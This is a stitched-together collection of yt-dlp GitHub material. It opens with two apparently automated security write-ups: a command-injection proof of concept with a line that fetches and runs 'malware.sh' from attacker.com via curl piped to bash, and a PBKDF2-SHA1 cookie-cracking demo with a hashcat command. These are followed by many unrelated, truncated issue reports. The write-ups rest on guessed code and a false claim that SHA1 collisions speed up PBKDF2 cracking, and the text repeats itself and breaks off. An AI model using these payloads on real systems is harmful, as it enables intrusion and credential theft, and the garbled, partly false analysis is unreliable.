The devscripts/install_deps.py file in yt-dlp accepts command-line arguments for dependency installation and uses them to construct shell commands via string concatenation without sanitization, enabling command injection. An attacker could exploit this by passing malicious arguments to the script, executing arbitrary commands on the system where the script runs, such as a developer's local machine or a CI environment. This is particularly feasible if the script is run during repository setup or build processes, potentially through social engineering or compromised CI pipelines.

```python
# Proof-of-Concept Exploitation Code
# This demonstrates command injection in devscripts/install_deps.py
# Assumes the script's code (based on repository analysis) does something like:
# import sys, os
# deps = sys.argv[1:]
# for dep in deps:
#     os.system(f""pip install {dep}"")
# (Note: This is a simplified representation; the actual code may vary but follows the described pattern of unsafe concatenation.)

# Attacker runs the script with injected commands
# On a developer's machine (after cloning the repo):
python devscripts/install_deps.py ""requests; echo 'Command injection successful'; curl http://attacker.com/malware.sh | bash; #""

# Breakdown of the malicious argument:
# - ""requests"" is a legitimate dependency to avoid immediate failure
# - "";"" terminates the pip install command and starts a new shell command
# - ""echo 'Command injection successful'"" proves execution (replace with any command)
# - ""curl http://attacker.com/malware.sh | bash"" downloads and executes remote code (e.g., backdoor installation)
# - ""#"" comments out any remaining arguments to prevent errors

# In a CI context (e.g., if devscripts are used in GitHub Actions or similar):
# Modify the CI script or pull request to invoke: python devscripts/install_deps.py ""some-dep; whoami; id; #""
# This could be done via a malicious commit or PR that alters the CI workflow to pass injected args.
```

#### Exploitation Impact Assessment

| Impact Category | Severity | Description |
|-----------------|----------|-------------|
| Data Exposure | Medium | Access to local files on the developer's machine or CI server, including yt-dlp source code, personal credentials (e.g., API keys in .env files or git config), and potentially cached video metadata. No direct access to end-user data, as yt-dlp's main functionality doesn't store sensitive user info centrally, but attacker could exfiltrate dev-specific secrets used for repository management. |
| System Compromise | High | Arbitrary code execution on the host system (e.g., developer's laptop or CI runner), allowing installation of malware, privilege escalation (e.g., via sudo exploits if available), or persistence mechanisms. Could lead to full control of the machine, enabling further attacks like lateral movement in a network or compromise of related tools. |
| Operational Impact | Medium | Disruption to development workflows, such as corrupted local environments (e.g., deleting dependencies or files), failed CI builds, or downtime in automated processes. For yt-dlp, this could delay releases or patches, indirectly affecting users if the repo's maintenance is halted, but no direct service outage for the tool itself. |
| Compliance Risk | Low | Potential violations of secure coding practices (e.g., OWASP Top 10 A03:2021 Injection flaws), but low regulatory impact since yt-dlp is an open-source tool without strict compliance requirements like GDPR (no user data handling in devscripts) or SOC2. Could affect internal security audits for organizations using yt-dlp in development pipelines. |

### Vulnerability Details
- **Rule ID**: `V-004`
- **File**: `devscripts/install_deps.py`

"[Security] Fix HIGH vulnerability: V-002 ## Security Fix

This PR addresses a **HIGH** severity vulnerability detected by our security scanner.

### Security Impact Assessment

| Aspect | Rating | Rationale |
|--------|--------|-----------|
| Impact | Low | In yt-dlp, a client-side video downloader tool, this vulnerability exists only in test code for cookie handling simulations, not in the core application logic, so exploitation would not affect actual video downloads or user data, resulting in minimal consequences like skewed test outputs without broader system compromise. |
| Likelihood | Low | yt-dlp is a command-line tool with no server components or exposed services, and the vulnerable code is confined to local test executions during development or CI, making it inaccessible to remote attackers and unlikely to be targeted given the lack of high-value assets or common attack vectors. |
| Ease of Fix | Easy | Remediation involves simply updating the PBKDF2 hash from SHA1 to a secure alternative like SHA256 in the test file, requiring no changes to dependencies, core code, or extensive testing, as it's isolated to non-production test logic. |

### Evidence: Proof-of-Concept Exploitation Demo

**⚠️ For Educational/Security Awareness Only**

This demonstration shows how the vulnerability could be exploited to help you understand its severity and prioritize remediation.

#### How This Vulnerability Can Be Exploited

The vulnerability in yt-dlp's test/test_cookies.py involves the use of PBKDF2 with SHA1 for key derivation in cookie-related testing. An attacker could exploit this by targeting any production code that mirrors this insecure key derivation (e.g., for encrypting/decrypting cookie jars), allowing faster brute-force cracking of derived keys to access stored cookies. This demonstrates how the weak hashing enables offline password cracking, potentially compromising user sessions or authentication data in yt-dlp's cookie handling.

The vulnerability in yt-dlp's test/test_cookies.py involves the use of PBKDF2 with SHA1 for key derivation in cookie-related testing. An attacker could exploit this by targeting any production code that mirrors this insecure key derivation (e.g., for encrypting/decrypting cookie jars), allowing faster brute-force cracking of derived keys to access stored cookies. This demonstrates how the weak hashing enables offline password cracking, potentially compromising user sessions or authentication data in yt-dlp's cookie handling.

```python
# Proof-of-Concept: Demonstrating insecure key derivation and cracking
# This simulates the vulnerable PBKDF2-SHA1 usage from yt-dlp's test/test_cookies.py
# In a real attack, an attacker would extract the salt, iterations, and hash from a compromised cookie file or similar.

import hashlib
import os
import binascii

# Simulate the vulnerable key derivation (mirroring yt-dlp's test code logic)
def vulnerable_pbkdf2(password, salt, iterations=10000, dklen=32):
    # This is the insecure PBKDF2-SHA1 as used in the test file
    return hashlib.pbkdf2_hmac('sha1', password.encode(), salt, iterations, dklen)

# Example: Generate a ""hashed"" key for a weak password (attacker might obtain this from a leaked cookie jar)
password = ""weakpass123""  # Hypothetical password used in yt-dlp cookie encryption
salt = os.urandom(16)  # Salt extracted from compromised cookie file
iterations = 10000  # As per yt-dlp's test code
derived_key = vulnerable_pbkdf2(password, salt, iterations)
print(""Derived key (hex):"", binascii.hexlify(derived_key).decode())

# Attacker's cracking script: Use a brute-force approach exploiting SHA1's weaknesses
# (SHA1 collisions make PBKDF2 faster to attack than with stronger hashes like SHA256)
# This is a simplified demo; in practice, use tools like hashcat for GPU-accelerated cracking.

def crack_pbkdf2(target_hash, salt, iterations, dklen=32, wordlist=[""weakpass123"", ""password"", ""123456""]):
    for candidate in wordlist:
        candidate_hash = hashlib.pbkdf2_hmac('sha1', candidate.encode(), salt, iterations, dklen)
        if candidate_hash == target_hash:
            return candidate
    return None

# Simulate cracking (attacker has the target hash from a stolen cookie file)
target_hash = derived_key
cracked_password = crack_pbkdf2(target_hash, salt, iterations)
if cracked_password:
    print(f""Cracked password: {cracked_password}"")
    # With the password, attacker can now decrypt yt-dlp's cookie jar (e.g., using yt-dlp's cookie loading logic)
else:
    print(""Password not in wordlist (but GPU cracking would succeed for weak passwords)"")

# Real-world attack steps:
# 1. Obtain yt-dlp's cookie file (e.g., via phishing, malware on user's machine, or supply chain compromise).
# 2. Extract salt, iterations, and PBKDF2-SHA1 hash (if the cookie jar uses this derivation).
# 3. Use hashcat: hashcat -m 12000 (PBKDF2-SHA1) -a 3 hashfile ?a?a?a?a?a?a?a?a (brute-force mode).
#   - SHA1's weaknesses allow ~10x faster cracking than SHA256 on modern GPUs.
# 4. Decrypt cookies and use them to access protected YouTube accounts or bypass rate limits.
```

#### Exploitation Impact Assessment

| Impact Category | Severity | Description |
|-----------------|----------|-------------|
| Data Exposure | High | Exposure of encrypted yt-dlp cookie jars could lead to cracking of user authentication data, allowing access to YouTube accounts, watch histories, and personal preferences. If cookies include session tokens for other services, broader data leakage (e.g., Google OAuth tokens) is possible, affecting millions of users who rely on yt-dlp for video downloads. |
| System Compromise | Low | No direct system access; exploitation is offline and limited to decrypting local cookie files. An attacker couldn't execute code on the user's machine without additional vectors (e.g., malware), but compromised cookies could enable social engineering or further phishing attacks. |
| Operational Impact | Medium | Successful cracking could disrupt yt-dlp usage by invalidating sessions or enabling account bans due to abuse. For users, this might cause temporary inaccessibility to video services, but no widespread service outages for yt-dlp itself, as it's a client-side tool. |
| Compliance Risk | Medium | Violates OWASP recommendations for secure password storage and could breach GDPR if user data (e.g., viewing habits) is linked to cookies. Fails security standards like NIST SP 800-63B, which deprecates SHA1, potentially impacting audits for tools handling personal data in regulated environments. |

### Vulnerability Details
- **Rule ID**: `V-002`
- **File**: `test/test_cookies.py`
- **Description**: The application's test code utilizes PBKDF2 with SHA1 for key derivation. SHA1 is a cryptographically broken hashing algorithm susceptible to collision attacks, and its use in a key derivation function is deprecated and considered insecure against modern password cracking hardware.

[download] Got error: HTTP Error 403: Forbidden. Retrying fragment 284 (9/10)...
after which:

ERROR: The downloaded file is empty

See complete verbose output below.

The video can be viewed in the browser (firefox) with no problem,

### Provide a description that is worded well enough to be understood

While the file generated with the video includes correct timing and some formatting, many other css elements (when the video uses them) is not present in the file. This includes outlines, shadow colors, font, font size, and possible other myriad of other formatting features.

The video downloaded: [Stamp on the Forest's Mushrooms](https://www.youtube.com/watch?v=Wg9NhrHDdSc), includes many of these formatting tricks. All thanks to manual captions applied by the creator.

Youtube seems to be going out of its way to remove manual captioning from some pre-existing videos, so im unsure how long this example will last. 

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

    **IMPORTANT**: PRs without the template will be CLOSED
    
    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.
    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.

    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.
    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

### Description of your *pull request* and other information

Two changes are made:

* The `[project.dependencies]` in `pyproject.toml` are expanded to include a `deno` ""extra"". When specified by the user (for example, when installing via `pipx install yt-dlp[deno]`, a recent `deno` package is installed into the environment. (I consider this an install-time feature)
* A step is added to the logic for finding a JS runtime: when a Deno runtime is requested, a deferred import of the Python `deno` package is attempted, and its logic is used to determine the path to Deno. Thus, if Deno is installed in yt-dlp's environment, it's preferred to anything found on PATH; otherwise, logic falls back to the previous options. (I consider this a general UX improvement)

Implements #15530.

"MoveFiles: fix cross-device move when temp dir is on tmpfs This PR fixes a failure when moving downloaded files from a tmpfs (e.g. /tmp) to another filesystem.

When the temp directory is on tmpfs, shutil.move() falls back to copy+delete and attempts to copy file metadata,
which can fail with PermissionError. This change replaces it with a safe rename + copyfile + unlink fallback
that avoids copying metadata and works correctly across filesystems.

Fixes #15534

"Add optional PyPI Deno support and prefer Python-installed runtime Fixes #15530

### Summary
Add an optional `deno` extra to install Deno from PyPI and update Deno runtime detection to prefer a Python-installed Deno before falling back to a system-installed Deno.

### Changes
- Add `deno` optional dependency in `pyproject.toml`
- Prefer `deno.find_deno_exe()` in Deno JS runtime resolution

### Testing
- `pip install -e .[deno]`
- `yt-dlp --verbose` shows `JS runtimes: deno-<version>`
- `pip uninstall deno` falls back to system Deno or reports none

### Region

Hongkong

### Provide a description that is worded well enough to be understood

I can't download any video from Youtube (I was able to download normally last month)

here is my ydl_opts
`    ydl_opts = {
        'cookiefile': ""D:/KagamineYE/desktop/c4v/utils/"" + cookie,
        'outtmpl': '_test_%(title)s■%(uploader)s■%(id)s.%(ext)s',
        'js_runtime': 'deno',
        'js_runtimes': {
            'deno': {
                'path': r'C:\Users\KagamineYE\.deno\bin\deno.exe'
            }
        },
        'verbose': True,
        'quiet': False,
    }`

console just keep droping like ""[download] fragment not found; Skipping fragment 29 ...""
""ERROR: The downloaded file is empty""

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.

I used the get cookies.txt extension to copy my cookies to the clipboard and paste them into `cookies.txt`. I think this is working, because I was getting a 404 before I updated my cookies.txt file.

### Please make sure the question is worded well enough to be understood

As a viewer on Twitch, you can create clips of other channels. These are located as a list at this url: https://dashboard.twitch.tv/u/YOUR_TWITCH_USERNAME/content/clips/created
Is there a way to download all the clips you've created using yt-dlp, or otherwise obtain all the links of the clips you've created for download? I've included a naïve attempt at passing the aforementioned link directly to yt-dlp with the proper cookies to no effect.

### Provide verbose output that clearly demonstrates the problem

Hello,
First of all, please excuse any inaccuracies in my wording, as I am Korean and writing this using ChatGPT and translation tools.

I have been using the yt-dlp -F command for a long time to download YouTube videos. However, at some point, the available formats suddenly changed, and as shown in the screenshot above, the maximum bitrate is now only around 2000–3000 kbps.

※ This video was uploaded by me to my own YouTube channel, so the original upload quality is definitely not low-bitrate.

I also use this command daily, so this is not a misunderstanding or a coincidence.

I have enabled comment notifications, so if you need any additional information, please leave a comment and I will respond right away.

"[ie/youtube] Fix HLS 403 errors by descrambling n parameter in manifest URLs ## Summary

Fixes #15569

The `n` parameter in HLS manifest URLs is located in the path as `/n/<value>/` rather than in the query string. This was causing **403 Forbidden errors** when downloading HLS formats (e.g., with `web_safari` client) because the `n` parameter was not being descrambled.

## Changes

- Extracts the `n` parameter from the HLS manifest URL path using regex
- Uses the existing JS challenge solver infrastructure to descramble it  
- Caches the result for reuse (same as HTTPS formats)
- Updates the manifest URL with the descrambled value

## Test

Before fix:

Quick one here : Aws access/secret keys are present in the repo and causing false positive in trivy security scans, are they still required ? Can we get rid of them here ? 😇

### Please make sure the question is worded well enough to be understood

Hi, with yt-dlp you can monitored the channel every couple of minutes, but after one live stream downloaded the command stop, and you have to manually execute the command again. Is there any way of automatically -repeat (monitoring channel command) with yt-dlp that doesn't involve batching?

Thanks

### Region

Russia

### Provide a description that is worded well enough to be understood

So I checked some posts about this issue and still get error. (Maybe I dumb)

I uses cookies, I installed deno, I get PO token (via external plugin mentioned in PO Token Giude). But I still get error. Maybe it's issue because I'm in Russia and have to use proxy (Zapret (dpi bypass utility)) for get access to youtube. But it worked like a week ago only with cookies. Maybe youtube have been blocked my IP?

I don't using docker. yt-dlp I use is package in ArchLinux.

Without debug I getting just multiple HTTP 403 Error. With debug I getting many errors.

"Fix Youtube not being tried first <!--
    **IMPORTANT**: PRs without the template will be CLOSED
    
    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.
    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.
-->

### Description of your *pull request* and other information

`inspect.getmembers` calls `sort` but even using `dir` this didn't work. Instead I just manually pull `Youtube` to the front.

Fixes #15594

### Please make sure the question is worded well enough to be understood

I want to download video with best formats with the command `--format ""bv+ba[language=vi]/b""` for 480p with `--format-sort`, if has 480p exist with YouTube's new ""Super Resolution"" with 480p, download, or else download the normal format, else if  that normal not exist, download the best pre-combined videos.

### Provide a description that is worded well enough to be understood

As shown in the profiler below (pyinstrument), checking PeerTube.suitable is very expensive due to the large number of instances it has to chew through and re.compile.

Technically it makes sense to check the extractors in alphabetical order, but would it make sense to somehow make an exception and check youtube first, if the url is something like youtube.com or youtu.be? Often users use youtube as an extractor for yt-dlp.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output
N/A

I've worked around the issue on my end by setting `--use-extractors 'youtube,all'`, but it would be nice to have this as a default (or at least better documented).",consider checking youtube extractor peertube default checklist requesting feature unrelated specific site looked readme verified updated dlp nightly master update instructions searched bugtracker similar requests including closed ones post duplicates read policy llm contributions understand may blocked repository violated provide description worded well enough understood shown profiler pyinstrument checking peertube suitable expensive due large number instances chew compile img width height alt image src technically makes sense check extractors alphabetical order would make sense somehow make exception check youtube first url something like youtube com youtu often users use youtube extractor dlp provide verbose output clearly demonstrates problem run dlp command flag added dlp command line using api add verbose true youtubedl params instead copy whole output starting debug command line config insert complete verbose output worked around issue end setting use extractors youtube would nice default least better documented

### Region

Serbia

### Provide a description that is worded well enough to be understood

I was downloading a video when I encountered an error. The server denied permission to the file, and as a result, fragments could not be retrieved, resulting in an empty file. (see the verbose log)

I tried applying all IP options, tried abort on error options, even cookies had a problem accepting permission. Couldn't install Deno due to missing file, althrough this was a strongly recommended JS runtime. Even updates yielded nothing.

Is this related to my system, or IP? Had this issue for over a year without yt-dlp, but today this has extended to yt-dlp.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"[YouTube] Got error: HTTP Error 403: Forbidden. Retrying fragment when downloading m3u8 protocols ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

I downloaded the video on YouTube m3u8 format file and got the error 403 Forbidden, download empty file.

On my screenshot, i opened this m3u8 link in browser and got the grey video frame screen, not loading & not downloading.

<img width=""1920"" height=""1080"" alt=""Image"" src=""https://github.com/user-attachments/assets/1012732c-c8b9-4f39-b62b-c0c274e37c0a"" />

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

Up until about 2 days ago it was still working perfectly, but now livestreams are returning 403 errors when using cookies.

The same cookie account works perfectly in the browser.

Browser example:
<img width=""1282"" height=""752"" alt=""Image"" src=""https://github.com/user-attachments/assets/8bf5de09-72c1-4efd-9c07-08a82ca44425"" />

The same thing happens when the --live-from-start parameter is not used.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Philippines

### Provide a description that is worded well enough to be understood

yt-dlp was able to download YouTube yesterday until today. I've tried following https://github.com/yt-dlp/yt-dlp/wiki/EJS . I've also tried passing the cookies.txt file instead from --cookies-from-browser and tried passing without any cookies.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Provide a description that is worded well enough to be understood

For some reason, CBC has borked their JSON formatting in the CBC Player. Their player processes it without any issues, but even the lenient JSON parser throws its hands up. The problem is it has a number of sections like this:
`""insertAd"":undefined`
which AFAIK is not valid JSON. For myself I've made a hacky solution by just adding the following line after the webpage is downloaded (about line 400):
`webpage = webpage.replace(':undefined', ':""undefined""')`
And suddenly everything works again.
At the moment I don't have time to implement a proper fix, but I hope this can help someone solve the problem without too much further effort.

I've been getting this intermittently yesterday, but today (**Jan 16th 2026**, in my timezone), even when enabling a **supported JS runtime** (**quickjs** in my case), `YouTube` will **refuse to cough up TV-client formats**; it appears they're now **locking the TV-client behind a logged-in YT account**; I don't currently have a Google 😡 account to begin with, nor am I inclined to register one with them just for the sake of YT, thus I'm now left with just the `ANDR-S` formats 😞 ~~(and the `WEB-S` ones, when no JS runtime is enabled)~~.

Probably **Google** are rolling out this progressively, as part of an A/B test (?), but I guess I'm being unlucky, as among the first to be affected...

Yesterday `yt-dlp -J ""https://www.facebook.com/ads/library/?id=312304267031140""` worked, today it errors with:
```
ERROR: [facebook:ads] 312304267031140: Unable to download webpage: HTTP Error 403: Client challenge (caused by <HTTPError 403: Client challenge>)
```

--- 

Challenge flow & bypass:

1. navigate to the page, and you are presented with 
```
$ curl https://www.facebook.com/ads/library/?id=312304267031140
<!DOCTYPE html>
<html>
<head>
<title>Ad Library</title>
</head>
<body>
<script>

(function() {
  if (document.readyState !== 'loading') {
    executeChallenge();
  } else {
    document.addEventListener('DOMContentLoaded', executeChallenge);
  }
  function executeChallenge() {
    fetch('/__rd_verify_Q_6hBQNhbQK82SnvsYkd-8VYF8YZIN4SEe01HeAKLLr0Jk2_gA?challenge=3', {
      method: 'POST',
    })
    .finally(() => window.location.reload());
  }
})();

</script>
</body>
</html>
```

2. fetch `https://www.facebook.com/__rd_verify_....` and you get a `set-cookie` header
```
$ curl -I https://www.facebook.com/__rd_verify_Q_6hBQNhbQK82SnvsYkd-8VYF8YZIN4SEe01HeAKLLr0Jk2_gA?challenge=3

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**.

### Provide a description that is worded well enough to be understood

I use the following command line parameters
```sh
--quiet \
--progress \
--newline \
--progress-template ""download:#%(progress.status)s %(progress.fragment_index)s%(progress.fragment_count)s\n%(progress._percent)s""
--progress-template ""postprocess:#%(progress._default_template
```
to pipe the output into `zenity` to display the progress. (Zenity expects the progress values in single lines and can display a legend above the progress bar; this legend must have a `#` in front of the line.)

I would expect an output like this:
```
#downloading 0/9
1
#downloading 0/9
2
...
```
but get
```
#downloading 0/9\n1
#downloading 0/9\n2
...
```

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

"[Error 65] No route to host (caused by TransportError('[Errno 65] No route to host')) ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

There is no reason for this connection to fail. So I'm trying to understand what I'm missing.

```
$ yt-dlp  --ignore-config http://172.16.0.27:9981/playlist/channels
[generic] Extracting URL: http://172.16.0.27:9981/playlist/channels

ERROR: [generic] Unable to download webpage: [Errno 65] No route to host (caused by TransportError('[Errno 65] No route to host'))
```

Whereas:
```

*   Trying 172.16.0.27:9981...
* Connected to 172.16.0.27 (172.16.0.27) port 9981

* Connection #0 to host 172.16.0.27 left intact
```

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Region

America

### Provide a description that is worded well enough to be understood

Videos from Disney download fine and subtitle files are generated when I add ""--write-sub"", but the subtitle file content is not subtitles, it is some XML code containing an error, like this:
`<?xml version=""1.0"" encoding=""utf-8""?><xml><result><error><objectType>KalturaAPIException</objectType><code>INVALID_KS</code><message>Invalid KS &quot;EXPIRED&quot;, Error &quot;-1,INVALID_STR&quot;</message><args><item><objectType>KalturaApiExceptionArg</objectType><name>KSID</name><value>EXPIRED</value></item><item><objectType>KalturaApiExceptionArg</objectType><name>ERR_CODE</name><value>-1</value></item><item><objectType>KalturaApiExceptionArg</objectType><name>ERR_DESC</name><value>INVALID_STR</value></item></args></error></result><executionTime>0.0072848796844482</executionTime></xml>`

I tried it with several videos, for example:
https://video.disney.com/watch/forces-of-destiny-teaser-552f38efb45a8a8d49483b10
https://video.disney.com/watch/star-wars-forces-of-destiny-volume-1-disney-55c041c3318b07cf2bb99b82
https://video.disney.com/watch/star-wars-forces-of-destiny-volume-2-disney-567f0bb335fea2cca5a11bc2

Watching the videos in a browser, I can see there are in fact subtitles when I click on the CC button of their player.

### Please make sure the question is worded well enough to be understood

I'm asking this as a question because this is likely user error rather than a bug report. I have been using ytdlp on live videos without issues on my VPS using cookies in conjunction with ffmpeg. This morning, all I'm getting is 403 forbidden. I am able to download regular videos, but live videos all return 403. Is there something I might've missed? I updated to the latest nightly, got all the standard debugging. Any help is appreciated.

The output has been truncated to not include parts that are too verbose and irrelevant.

### Provide verbose output that clearly demonstrates the problem

### Region

United States of America

### Provide a description that is worded well enough to be understood

Up until about 2 weeks ago, downloads from Xiaohongshu.com were in the highest quality but since then I've only been able to download at a max resolution of 1080p. I verified by re-downloading a video I previously downloaded in 4K; the video now only downloads in 1080p.

For all I know, Xiaohongshu are clamping down on source-quality downloads so this might not be something yt-dlp can fix.

The verbose output below is for a video where I'm not sure if the original was in 4K quality.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Region

Japan

### Provide a description that is worded well enough to be understood

When I use ""--source-address 0.0.0.0"", I still get the url which contains my vps's ip address.
And the video isn't playable from another ip(403 error occour when I request seg.ts).
I could use this method until yesterday but now I can't.

I was using yt-dlp to get a link of videos and watching in my safari(iPad).
Becaus of my vps's bandwidth limit and security policy, I can't put my vps and iPad into the same ip.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead

### Provide a description that is worded well enough to be understood

I was using web_safari client for m3u8 formats for a long time. But suddenly, I started getting a 403 error while downloading. It is not even working now on my local system, and in remote server with proxy and cookies, it is now giving 403. I refreshed cookies and changed the proxy multiple times, but it doesn't work. The video is playable with the same account and proxy in chrome browser.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

ERROR: Interrupted by user


I can confirm this was working two days ago with the current build of yt-dlp ( 2025.12.08-2 )
I have tried the nightly release ( 2026.01.06.233142 ) and it provides the same error.
It also fails on an older build ( 2024.12.23-1 )

The command I am running is 
`yt-dlp -a ""tiktok_links.txt"" --cookies-from-browser firefox -o ""TikTok/%(uploader)s/%(title)s - %(id)s.%(ext)s""`

An example of a link found in the tiktok_links.txt is 
https://www.tiktok.com/@watts.my.front.na/video/7594459233567952146

This fails in the same way when ran on the link directly.

### Region

_No response_

### Provide a description that is worded well enough to be understood

Yt-dlp seems to be unable to extract data on uploader or artist from Rule34video.com
Other data such as view count and like count are also unavailable except for tags.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

Sometimes i'm getting a warning ""Some web client https formats have been skipped as they are missing a url"" and sometimes i'm not, so i retry downloading 2-3 times and warning is gone. I want to automate this proccess, i want yt-dlp to retry 10 times automatically, if i'm getting this particular warning. How can i do that?

Signature and n-challenge solving fails when downloading YouTube Shorts.

Environment has no available JS runtime (node/deno/bun/quickjs).
As a result, format extraction succeeds but HLS fragments return 403 Forbidden.

This happens even with valid cookies and proxy enabled.

Trying to download BBC Sounds radio program. 
https://www.bbc.co.uk/sounds/play/m002nv9p
Worked from same site but different porogram a couple of weeks ago. Now comes up with : 
 
[bbc] m002nv9p: Downloading webpage
ERROR: [bbc] m002nv9p: Unable to extract playlist data;

Seems to affect all BBC Sounds shows.
I am in New Zealand. I use Nord VPN to log on as a user in London.
No problems hearing it through a browser.
Thank you.

### Provide a description that is worded well enough to be understood

Used yt-dlp with YouTube to convert videos to mp4 a few years ago with no problems, then tried again today with errors. Downloaded yt-dlp-ejs with pip to ensure it wasn't a signature reading issue, then updated to master release of yt-dlp with no success. Initially I tried the command with a couple different format options (mp4, ogg), and the errors listed something about unsupported formats.

The non-verbose log lists the error as "" [youtube] Unable to download API page: HTTP Error 400: Bad Request (caused by <HTTPError 400: 'Bad Request'>)"", which was similar to a few existing issues, but all of them seemed to be related to installs via apt or custom builds, which I'm not using. The URL I used for testing is one that I successfully converted to mp4 in the past using yt-dlp.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

Hello.

